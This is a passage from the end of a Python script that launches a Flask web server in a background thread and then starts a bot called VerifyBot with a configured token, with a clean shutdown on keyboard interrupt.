    # Start Flask
    flask_thread = threading.Thread(target=run_flask)
    flask_thread.daemon = True
    flask_thread.start()
    logger.info(f"🌐 Flask server started on port {PORT}")
    
    # Start bot
    bot_instance = VerifyBot()
    await bot_instance.start(TOKEN)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        logger.info("\n👋 Shutting down...")
        sys.exit(0)
